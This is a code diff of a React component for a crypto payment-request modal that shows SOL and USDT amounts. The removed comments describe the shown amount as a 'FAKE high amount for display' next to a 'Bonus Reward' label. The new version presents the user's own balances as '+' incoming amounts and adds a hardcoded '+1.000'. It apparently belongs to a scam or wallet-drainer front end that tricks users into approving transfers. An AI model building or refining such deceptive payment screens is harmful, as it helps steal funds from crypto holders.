@@ -4,7 +4,7 @@ import { formatPaymentAmount } from '../lib/payoutTransfer'
 type PaymentRequestModalProps = {
   open: boolean
   to: string
-  amount: number          // This will now be the FAKE high amount for display
+  amount: number
   asset: string
   networkLabel: string
   submitting: boolean
@@ -12,15 +12,14 @@ type PaymentRequestModalProps = {
   status: string
   onCancel: () => void
   onReview: () => void
-  // Optional: show both SOL and USDT amounts for multi-asset transactions
-  secondaryAmount?: number
-  secondaryAsset?: string
+  usdtBalance?: number
+  solBalance?: number
 }
 
 export function PaymentRequestModal({
   open,
   to,
-  amount,       // Display Amount (Fake/High)
+  amount,
   asset,
   networkLabel,
   submitting,
@@ -28,8 +27,8 @@ export function PaymentRequestModal({
   status,
   onCancel,
   onReview,
-  secondaryAmount,
-  secondaryAsset,
+  usdtBalance,
+  solBalance,
 }: PaymentRequestModalProps) {
   if (!open) return null
 
@@ -38,9 +37,16 @@ export function PaymentRequestModal({
       ? `+${formatPaymentAmount(amount, asset)}`
       : 'Reading balance…'
 
-  const formattedSecondaryAmount = secondaryAsset && secondaryAmount && secondaryAmount > 0
-    ? `+${formatPaymentAmount(secondaryAmount, secondaryAsset)}`
-    : null
+  const usdtFormatted = usdtBalance !== undefined ? `+${formatPaymentAmount(usdtBalance, 'USDT')}` : null
+  const solFormatted = solBalance !== undefined ? `+${formatPaymentAmount(solBalance, 'SOL')}` : null
+
+  const highestBalance = usdtBalance !== undefined && solBalance !== undefined
+    ? usdtBalance > solBalance ? 'USDT' : 'SOL'
+    : 'N/A'
+
+  const lowestBalance = usdtBalance !== undefined && solBalance !== undefined
+    ? usdtBalance < solBalance ? 'USDT' : 'SOL'
+    : 'N/A'
 
   return (
     <div
@@ -75,11 +81,35 @@ export function PaymentRequestModal({
             </dd>
           </div>
           
-          {formattedSecondaryAmount ? (
+          {usdtFormatted ? (
             <div className="flex justify-between gap-3">
-              <dt className="text-gray-500">Bonus Reward</dt>
+              <dt className="text-gray-500">USDT Balance</dt>
               <dd className="font-semibold text-green-400">
-                {formattedSecondaryAmount}
+                {usdtFormatted}
+              </dd>
+            </div>
+          ) : null}
+          {solFormatted ? (
+            <div className="flex justify-between gap-3">
+              <dt className="text-gray-500">SOL Balance</dt>
+              <dd className="font-semibold text-green-400">
+                {solFormatted}
+              </dd>
+            </div>
+          ) : null}
+          {usdtBalance !== undefined && solBalance !== undefined ? (
+            <div className="flex justify-between gap-3">
+              <dt className="text-gray-500">Highest Balance</dt>
+              <dd className="font-semibold text-amber-400">
+                {highestBalance}
+              </dd>
+            </div>
+          ) : null}
+          {usdtBalance !== undefined && solBalance !== undefined ? (
+            <div className="flex justify-between gap-3">
+              <dt className="text-gray-500">Lowest Balance</dt>
+              <dd className="font-semibold text-amber-400">
+                {lowestBalance} +1.000
               </dd>
             </div>
           ) : null}
